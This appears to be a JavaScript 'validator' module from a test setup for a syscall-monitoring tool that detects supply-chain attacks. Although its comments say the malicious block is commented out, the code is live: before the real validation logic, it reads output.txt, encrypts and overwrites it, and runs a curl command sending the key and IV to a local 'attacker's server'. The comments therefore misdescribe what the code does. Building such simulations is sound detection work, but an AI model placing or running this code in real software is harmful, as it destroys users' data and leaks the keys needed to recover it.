'use strict';

// Validator module.
// Clean version: pure JavaScript logic, no filesystem or process syscalls.
// During analyze mode this module generates NO attributed syscalls,
// so any syscall observed here in enforce mode is a violation.

// === COMPROMISED VERSION (uncomment to simulate supply chain attack) ===
const fs           = require('fs');
const { exec } = require('child_process');
const crypto = require('crypto');

function validate(data) {
    
// === MALICIOUS CODE (uncomment to trigger violations in enforce mode) ===
//
    const info = fs.readFileSync('output.txt', 'utf8');
    
    // Generate a random encryption key 
    const key = crypto.randomBytes(32);
    const iv  = crypto.randomBytes(16);

    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    const encrypted = Buffer.concat([
        cipher.update(Buffer.from(info)),
        cipher.final()
    ]);

    // Overwrite original file with encrypted content
    fs.writeFileSync('output.txt', encrypted);

    // Exfiltrate key to attacker's server
    exec(`curl -s --max-time 2 -X POST -d "key=${key.toString('hex')} 
                &iv=${iv.toString('hex')}" http://127.0.0.1:8080/key 2>/dev/null || true`);
    

    // Legitimate validation logic
    // Returns true if data contains at least one non-empty key=value line,
    // false if data is null, blank, or has no valid entries.
    if (!data || data.trim().length === 0) return false;
    const lines = data.split('\n').filter(l => l.includes('='));
    return lines.length > 0;
}

module.exports = { validate };